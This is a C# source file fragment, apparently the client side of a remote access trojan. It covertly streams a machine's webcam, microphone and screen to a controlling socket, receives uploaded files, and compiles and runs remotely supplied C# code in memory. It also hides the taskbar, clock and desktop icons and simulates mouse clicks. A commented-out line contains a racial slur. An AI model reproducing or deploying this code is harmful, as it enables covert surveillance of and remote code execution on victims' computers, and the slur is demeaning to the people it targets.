			return text;
		}
		public static void MouseClick(int x, int y, int leftClick = 0)
		{
			SetCursorPos(x, y);
			switch (leftClick)
			{
				case 0:
					mouse_event(MOUSEEVENTF_LEFTDOWN, x, y, 0, 0);
					mouse_event(MOUSEEVENTF_LEFTUP, x, y, 0, 0);
					break;
				case 1:
					mouse_event(MOUSEEVENTF_RIGHTDOWN, x, y, 0, 0);
					mouse_event(MOUSEEVENTF_RIGHTUP, x, y, 0, 0);
					break;
			}
		}
		private static long GetDirectorySize2(string folderPath)
		{
			DirectoryInfo di = new DirectoryInfo(folderPath);
			return di.EnumerateFiles("*", SearchOption.AllDirectories).Sum(fi => fi.Length);
		}
		static long GetDirectorySize(string path)
		{
			try
			{
				// 1
				// Get array of all file names.
				string[] a = Directory.GetFiles(path, "*.*");

				// 2
				// Calculate total bytes of all files in a loop.
				long b = 0;
				foreach (string name in a)
				{
					// 3
					// Use FileInfo to get length of each file.
					FileInfo info = new FileInfo(name);
					b += info.Length;
				}
				// 4
				// Return total size
				return b;
			}
			catch { return 0; }
		}
		public static long GetDirectorySizeOld(DirectoryInfo d)
		{
			long size = 0;
			// Add file sizes.
			FileInfo[] fis = d.GetFiles();
			foreach (FileInfo fi in fis)
			{
				size += fi.Length;
			}
			// Add subdirectory sizes.
			DirectoryInfo[] dis = d.GetDirectories();
			foreach (DirectoryInfo di in dis)
			{
				size += GetDirectorySizeOld(di);
			}
			return size;
		}
		public static void HClock(bool hide)
		{
			if (hide)
				ShowWindow(FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), IntPtr.Zero, "TrayNotifyWnd", null), IntPtr.Zero, "TrayClockWClass", null), SW_HIDE);
			else
				ShowWindow(FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), IntPtr.Zero, "TrayNotifyWnd", null), IntPtr.Zero, "TrayClockWClass", null), SW_SHOW);
		}
		public static void HTaskBar(bool hide)
		{
			if (hide)
				ShowWindow(FindWindow("Shell_TrayWnd", null), SW_HIDE);
			else
				ShowWindow(FindWindow("Shell_TrayWnd", null), SW_SHOW);
		}
		public static void HDesktop()
		{
			var toggleDesktopCommand = new IntPtr(0x7402);
			SendMessage(GetDesktopSHELLDLL_DefView(), WM_COMMAND, toggleDesktopCommand, IntPtr.Zero);
		}
		public static void HTrayIcons(bool hide)
		{
			if (hide)
				ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null), IntPtr.Zero, "TrayNotifyWnd", null), SW_HIDE);
			else
				ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null), IntPtr.Zero, "TrayNotifyWnd", null), SW_SHOW);
		}
		public static void HStart(bool hide)
		{
			if (hide)
				ShowWindow(FindWindow("Button", null), SW_HIDE);
			else
				ShowWindow(FindWindow("Button", null), SW_SHOW);
		}
		public static async void TextToSpeech(string text, int vol = 100, int rate = 0)
		{
			SpeechSynthesizer synthesizer = new SpeechSynthesizer();
			synthesizer.Volume = vol;  // 0...100
			synthesizer.Rate = rate;     // -10...10
			// Asynchronous
			synthesizer.SpeakAsync(text);
		}
		private static int webcamQuality;
		private static ImageConverter convert = new ImageConverter();
		public static void WebCam_Stream(int deviceId = 0, int resIndex = 0, int quality = 50)
		{
			webcamQuality = quality;
			videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
			videoSource = new VideoCaptureDevice(videoDevices[deviceId].MonikerString);
			videoSource.VideoResolution = videoSource.VideoCapabilities[resIndex];
			videoSource.NewFrame += new NewFrameEventHandler(videoSource_NewFrame);
			videoSource.Start();
		}
		private static void videoSource_NewFrame(object sender, NewFrameEventArgs e)
		{
			try
			{
				Bitmap frame = (Bitmap)e.Frame.Clone();
				byte[] header = uniEncoder.GetBytes("servmod^wcstream");
				byte[] frameBytes = CompressBitmap(frame, webcamQuality);//(byte[])convert.ConvertTo(frame, typeof(byte[]));
				byte[] data = new byte[frameBytes.Length + 32];

				Buffer.BlockCopy(header, 0, data, 0, header.Length);
				Buffer.BlockCopy(frameBytes, 0, data, header.Length, frameBytes.Length);

				_clientSocket.Send(data, 0, data.Length, SocketFlags.None);

				frame.Dispose();
			}
			catch { }
		}
		private static void Audio_Stream(int deviceId = 0, WasapiLoopbackCapture captureDevice = null)
		{
			if (captureDevice != null)
			{
				internalSource = captureDevice;
				internalSource.DataAvailable += audioSource_NewAudio;
				internalSource.RecordingStopped += (s, a) =>
				{
					internalSource.Dispose();
					internalSource = null;
				};
				internalSource.StartRecording();
			}
			else
			{
				audioSource = new WaveInEvent();
				audioSource.DeviceNumber = deviceId;
				audioSource.WaveFormat = new WaveFormat(44100, 16, WaveIn.GetCapabilities(deviceId).Channels); 
				audioSource.DataAvailable += audioSource_NewAudio;
				audioSource.RecordingStopped += (s, a) =>
				{
					audioSource.Dispose();
					audioSource = null;
				};
				audioSource.StartRecording(); 
			}
		}
		private static void audioSource_NewAudio(object sender, WaveInEventArgs e)
		{
			byte[] header = uniEncoder.GetBytes("servmod^austream");
			byte[] data = new byte[e.BytesRecorded + 32];

			Buffer.BlockCopy(header, 0, data, 0, header.Length);
			Buffer.BlockCopy(e.Buffer, 0, data, header.Length, e.BytesRecorded);

			_clientSocket.Send(data, 0, data.Length, SocketFlags.None);
			//print("\rSize of each audio bit: " + data.Length);
		}

		private static void Screen_Stream(string resolution, double fps = 30, int quality = 100, int screen = 0, bool captureCursor = true, bool hwacc = false)
		{
			resolution = resolution.Replace(" ", "");
			int screenWidth = Screen.AllScreens[screen].Bounds.Width;
			int screenHeight = Screen.AllScreens[screen].Bounds.Height;
			/*int w;
			int h;
			if (resolution.ToLower() == "nativeresolution")
			{
				w = Screen.PrimaryScreen.Bounds.Width;
				h = Screen.PrimaryScreen.Bounds.Height;
			}
			else
			{
				w = Convert.ToInt32(resolution.Split('x')[0]);
				h = Convert.ToInt32(resolution.Split('x')[1]);
			}*/
			Send("remote_desktop\nscreen_res\n" + screenWidth.ToString() + "\n" + screenHeight.ToString());
			if (_DEBUG)
			{
				if (!hwacc) 
				{
					Stopwatch stopwatch = new Stopwatch();
					Stopwatch secondsTimer = new Stopwatch();
					double longest = 0;
					double least = 0;
					double current = 0;
					double average = 0;
					double secondsPassed = 0;

					long frames = 0;
					while (RemoteDekstop)
					{
						stopwatch.Start();
						secondsTimer.Start();

						using (Bitmap bm = new Bitmap(screenWidth, screenHeight, System.Drawing.Imaging.PixelFormat.Format32bppArgb))
						{
							using (Graphics g = Graphics.FromImage(bm))
							{
								g.CopyFromScreen(0, 0, 0, 0, bm.Size, CopyPixelOperation.SourceCopy);
								//BitBlt too slow
								//g.CopyFromScreen((screenWidth / 2) * -1, (screenHeight / 2) * -1, (screenWidth / 2) * -1, (screenHeight / 2) * -1, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
								//g.CopyFromScreen((screenWidth / 2), (screenHeight / 2) * -1, (screenWidth / 2), (screenHeight / 2) * -1, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
								//g.CopyFromScreen(screenWidth / 2, screenHeight / 2, screenWidth / 2, screenHeight / 2, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
								//g.CopyFromScreen((screenWidth / 2) * -1, screenHeight / 2, (screenWidth / 2) * -1, screenHeight / 2, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);

								if (captureCursor)
								{
									CURSORINFO pci;
									pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));

									//cursor capture
									if (GetCursorInfo(out pci))
									{
										if (pci.flags == CURSOR_SHOWING)
										{
											DrawIcon(g.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
											g.ReleaseHdc();
										}
									}
								}

								frames++;

								byte[] imageBytes = CompressBitmap(bm, quality);

								byte[] header = uniEncoder.GetBytes("servmod^scstream");
								byte[] data = new byte[imageBytes.Length + 32];

								Buffer.BlockCopy(header, 0, data, 0, header.Length);
								Buffer.BlockCopy(imageBytes, 0, data, 32, imageBytes.Length);

								_clientSocket.Send(data, 0, data.Length, SocketFlags.None);


								current = stopwatch.ElapsedMilliseconds;
								if (longest == 0 && least == 0)
								{
									longest = current;
									least = current;
								}
								if (current > longest) longest = current;
								if (current < least) least = current;
								average = (longest + least) / 2;
								stopwatch.Stop();
								stopwatch.Reset();
								if (secondsTimer.ElapsedMilliseconds > 0)
								{
									secondsPassed = secondsTimer.ElapsedMilliseconds / 1000;
								}

								fps = frames / secondsPassed;

								printline();
								printline("Average Frame time: {0}ms", current);
								printline("Average frame size: {0}bytes", imageBytes.Length);
								printline("FPS: {0}", fps.ToString("0.00"));
								printline("Frames: {0}", frames);
								printline("Seconds Passed: {0}", secondsPassed.ToString("0.00"));
								printline("Resolution: {0}", resolution);
								Console.SetCursorPosition(0, Console.CursorTop - 7);
							}
						}
					}
				}
			}
			else
			{
				if (!hwacc)
				{
					while (RemoteDekstop)
					{
						using (Bitmap bm = new Bitmap(screenWidth, screenHeight, System.Drawing.Imaging.PixelFormat.Format32bppArgb))
						{
							using (Graphics g = Graphics.FromImage(bm))
							{
								g.CopyFromScreen(0, 0, 0, 0, bm.Size, CopyPixelOperation.SourceCopy);
								//BitBlt too slow
								//g.CopyFromScreen((screenWidth / 2) * -1, (screenHeight / 2) * -1, (screenWidth / 2) * -1, (screenHeight / 2) * -1, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
								//g.CopyFromScreen((screenWidth / 2), (screenHeight / 2) * -1, (screenWidth / 2), (screenHeight / 2) * -1, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
								//g.CopyFromScreen(screenWidth / 2, screenHeight / 2, screenWidth / 2, screenHeight / 2, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);
								//g.CopyFromScreen((screenWidth / 2) * -1, screenHeight / 2, (screenWidth / 2) * -1, screenHeight / 2, new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy);

								if (captureCursor)
								{
									CURSORINFO pci;
									pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));

									//cursor capture
									if (GetCursorInfo(out pci))
									{
										if (pci.flags == CURSOR_SHOWING)
										{
											DrawIcon(g.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
											g.ReleaseHdc();
										}
									}
								}

								byte[] imageBytes = CompressBitmap(bm, quality);

								byte[] header = uniEncoder.GetBytes("servmod^scstream");
								byte[] data = new byte[imageBytes.Length + 32];

								Buffer.BlockCopy(header, 0, data, 0, header.Length);
								Buffer.BlockCopy(imageBytes, 0, data, 32, imageBytes.Length);

								_clientSocket.Send(data, 0, data.Length, SocketFlags.None);
							}
						}
					}
				}
			}
		}

		public static void DownloadFile(byte[] data, int count)
		{
			Console.Write($"\rRecieved: {data.Length} fo_writeSize: {fo_writeSize} fo_size: {fo_size}");
			Buffer.BlockCopy(data, 0, fileBuffer, fo_writeSize, count);
			fo_writeSize += data.Length;
			if (fo_writeSize >= fo_size)
			{
				using (var fs = File.Create(fo_path))
				{
					fs.Write(fileBuffer, 0, fileBuffer.Length);
				}
				fo_writeSize = 0;
				fo_size = 0;
				fo_mode = 3;
				Array.Clear(fileBuffer, 0, fileBuffer.Length);
				Send("file_operation\nfile_uploadFinished");
			}
			Thread.Sleep(500); //Let's be friendly to the network bandwidth :)
			Send($"file_operation\ndfprog\n{fo_writeSize}");
		}
		//https://www.codeproject.com/Articles/2941/Resizing-a-Photographic-image-with-GDI-for-NET
		static Bitmap Resize(Bitmap imgPhoto, int Width, int Height)
		{
			int sourceWidth = imgPhoto.Width;
			int sourceHeight = imgPhoto.Height;
			int sourceX = 0;
			int sourceY = 0;
			int destX = 0;
			int destY = 0;

			float nPercent = 0;
			float nPercentW = 0;
			float nPercentH = 0;

			nPercentW = ((float)Width / (float)sourceWidth);
			nPercentH = ((float)Height / (float)sourceHeight);
			if (nPercentH < nPercentW)
			{
				nPercent = nPercentH;
				destX = System.Convert.ToInt16((Width - (sourceWidth * nPercent)) / 2);
			}
			else
			{
				nPercent = nPercentW;
				destY = System.Convert.ToInt16((Height - (sourceHeight * nPercent)) / 2);
			}

			int destWidth = (int)(sourceWidth * nPercent);
			int destHeight = (int)(sourceHeight * nPercent);

			Bitmap bmPhoto = new Bitmap(Width, Height, PixelFormat.Format24bppRgb);
			bmPhoto.SetResolution(imgPhoto.HorizontalResolution, imgPhoto.VerticalResolution);

			Graphics grPhoto = Graphics.FromImage(bmPhoto);
			grPhoto.Clear(Color.Black);
			grPhoto.InterpolationMode = InterpolationMode.HighQualityBicubic;

			grPhoto.DrawImage(imgPhoto, new Rectangle(destX, destY, destWidth, destHeight), new Rectangle(sourceX, sourceY, sourceWidth, sourceHeight), GraphicsUnit.Pixel);

			grPhoto.Dispose();
			return bmPhoto;
		}
		//https://stackoverflow.com/questions/3034167/compress-bitmap-before-sending-over-network
		private static byte[] CompressBitmap(Bitmap bmp, long quality)
		{
			using (var mss = new MemoryStream())
			{
				EncoderParameter qualityParam = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
				ImageCodecInfo imageCodec = ImageCodecInfo.GetImageEncoders().FirstOrDefault(o => o.FormatID == ImageFormat.Jpeg.Guid);
				EncoderParameters parameters = new EncoderParameters(1);
				parameters.Param[0] = qualityParam;
				bmp.Save(mss, imageCodec, parameters);
				return mss.ToArray();
			}
		}

		private static void RunCSScript(string script, string[] references)
		{
			string sNamespace = string.Empty;
			string sClass = string.Empty;
			string sMethod = string.Empty;
			string[] sParams = new string[] { "ia neb ev me" };

			foreach (var line in script.Split('\n'))
			{
				var tLine = line.Trim();
				if (tLine.StartsWith("namespace "))
					sNamespace = tLine.Split(' ')[1];
				else if (tLine.StartsWith("public class"))
					sClass = tLine.Split(' ')[2];
				else if (tLine.StartsWith("public ") && tLine.Contains('(') && tLine.Contains(')'))
				{
					var name = tLine.Split(' ')[2];
					if (name.Contains('('))
						sMethod = name.Remove(name.Length - (name.IndexOf('(')) - 2);
				}
			}

			printline("Compiler starting...");
			SyntaxTree syntaxTree = CSharpSyntaxTree.ParseText(script);
			string assemblyName = Path.GetRandomFileName();
			List<string> refPaths = new List<string>
			{
				typeof(System.Object).GetTypeInfo().Assembly.Location,
				typeof(Console).GetTypeInfo().Assembly.Location,
				Path.Combine(Path.GetDirectoryName(typeof(System.Runtime.GCSettings).GetTypeInfo().Assembly.Location), "System.Runtime.dll")
			};

			foreach (string lib in references)
			{
				string formatted = Path.Join(AppDomain.CurrentDomain.BaseDirectory, lib.Replace("\r", string.Empty) + ".dll");
				if (File.Exists(formatted))
				{
					try
					{
						var assembly = AssemblyName.GetAssemblyName(formatted);
						refPaths.Add(formatted);
						printline(formatted);
					}
					catch { continue; }
				}
			}

			/*foreach (string dll in Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory, "*.dll"))
			{
				try
				{
					var assembly = AssemblyName.GetAssemblyName(dll);
					refPaths.Add(dll);
				}
				catch { continue; }
			}*/

			printline("References:");
			MetadataReference[] refs = refPaths.Select(r => MetadataReference.CreateFromFile(r)).ToArray();
			foreach (var r in refPaths)
				printline("\t" + r);

			printline("Compiling...");
			CSharpCompilation compilation = CSharpCompilation.Create
			(
			   assemblyName,
			   syntaxTrees: new[] { syntaxTree },
			   references: refs,
			   options: new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary)
			 );

			MemoryStream fileStream = new MemoryStream();
			EmitResult res = compilation.Emit(fileStream);
			if (!res.Success)
			{
				printline("Error while compiling: ");
				IEnumerable<Diagnostic> failures = res.Diagnostics.Where(diagnostic => diagnostic.IsWarningAsError || diagnostic.Severity == DiagnosticSeverity.Error);

				foreach (Diagnostic diagnostic in failures)
				{
					Console.Error.WriteLine("\t{0}: {1} ({2})", diagnostic.Id, diagnostic.GetMessage(), diagnostic.Location);
					//ReportError($"An error occured while compiling:\n{diagnostic.Id}: {diagnostic.GetMessage()} :: {diagnostic.Location}");
				}
			}
			else
			{
				printline("Compilation successful.");
				fileStream.Seek(0, SeekOrigin.Begin);

				var assembly = AssemblyLoadContext.Default.LoadFromStream(fileStream);
				var type = assembly.GetType("Kore.Klass");
				var instance = assembly.CreateInstance("Kore.Klass");
				var meth = type.GetMember("Main").First() as MethodInfo;
				meth.Invoke(instance, sParams);
				fileStream.Dispose();
				fileStream.Close();
				GC.Collect();
				GC.WaitForPendingFinalizers();

				//APPDOMAIN NOT SUPPORTED ANYMORE
				/*//AppDomainSetup setup = AppDomain.CurrentDomain.SetupInformation;
				AppDomain newDomain = AppDomain.CreateDomain("newDomain"); //Create an instance of loader class in new appdomain  
				System.Runtime.Remoting.ObjectHandle obj = newDomain.CreateInstance(typeof(LoadMyAssembly).Assembly.FullName, typeof(LoadMyAssembly).FullName);

				LoadMyAssembly loader = (LoadMyAssembly)obj.Unwrap();//As the object we are creating is from another appdomain hence we will get that object in wrapped format and hence in the next step we have unwrapped it  

				//Call loadassembly method so that the assembly will be loaded into the new appdomain and the object will also remain in the new appdomain only.  
				loader.LoadAssembly(ms.ToArray());

				//Call exceuteMethod and pass the name of the method from assembly and the parameters.  
				loader.ExecuteMainMethod("empty", "Main", sClass, new object[] { "nigger" });
				AppDomain.Unload(newDomain); //After the method has been executed call the*/


				/*var dllPath = temp_file; // dll and deps.json file together .
				var pc = new PluginLoadContext(dllPath);
				var assembly = pc.LoadFromAssemblyPath(dllPath);//pc.LoadFromAssemblyName(new AssemblyName(dllPath));


				//You can load a reference dll too if you need it
				//var referenceAssembly = pc.LoadFromAssemblyName(new AssemblyName(Path.GetFileNameWithoutExtension(rnd)));

				//Assembly assembly = AssemblyLoadContext.Default.LoadFromStream(ms);
				var type = assembly.GetType($"{sNamespace}.{sClass}");
				var instance = assembly.CreateInstance($"{sNamespace}.{sClass}");
				var meth = type.GetMember("Main").First() as MethodInfo;
				meth.Invoke(instance, new object[] { "param" });
				pc.Unload();*/
			}
		}
		private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs) //microsoft code lol
		{
			// Get the subdirectories for the specified directory.
			DirectoryInfo dir = new DirectoryInfo(sourceDirName);

			if (!dir.Exists)
			{
				throw new DirectoryNotFoundException(
					"Source directory does not exist or could not be found: "
					+ sourceDirName);
			}

			DirectoryInfo[] dirs = dir.GetDirectories();

			// If the destination directory doesn't exist, create it.       
			Directory.CreateDirectory(destDirName);

			// Get the files in the directory and copy them to the new location.
			FileInfo[] files = dir.GetFiles();
			foreach (FileInfo file in files)
			{
				string tempPath = Path.Combine(destDirName, file.Name);
				file.CopyTo(tempPath, false);
			}

			// If copying subdirectories, copy them and their contents to new location.
			if (copySubDirs)
			{
				foreach (DirectoryInfo subdir in dirs)
				{
					string tempPath = Path.Combine(destDirName, subdir.Name);
					DirectoryCopy(subdir.FullName, tempPath, copySubDirs);
				}
			}
		}
		public static void Send(string response)
		{
			string r = response;

			string encrypted = Encrypt(r);
			byte[] data = Encoding.Unicode.GetBytes(encrypted);
			if (fo_mode != 1)
				_clientSocket.Send(data);
			/*if (fo_size == 0)
				_clientSocket.Send(data);*/
		}
		public static int SendBytes(byte[] data)
		{;
			return _clientSocket.Send(data);
		}

		public static void ReportError(string text, string title = "An Error occured on the client side", MessageBoxButtons btn = MessageBoxButtons.OK, MessageBoxIcon icn = MessageBoxIcon.Error)
		{
			Send($"display_msgbox\n{title}\n{(int) icn}\n{(int) btn}\n@{{msg}}{text}");
			//Send("display_msgbox\nAn Error occured on the client side\n1\n1\n@{msg}Error: Either device is in use or something's wrong with my code.\nClick 'OK' to see the full exception.");
		}
		public static bool IsAdmin()
		{
			using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
			{
				WindowsPrincipal principal = new WindowsPrincipal(identity);
				return principal.IsInRole(WindowsBuiltInRole.Administrator);
			}
		}
	}
}
